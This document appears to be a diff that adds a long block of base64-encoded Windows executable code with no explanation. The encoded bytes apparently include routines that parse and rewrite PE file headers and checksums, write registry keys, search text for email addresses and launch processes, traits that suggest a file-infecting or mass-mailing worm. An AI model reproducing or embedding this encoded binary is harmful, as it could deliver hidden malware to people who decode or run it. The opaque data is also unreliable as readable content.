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
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
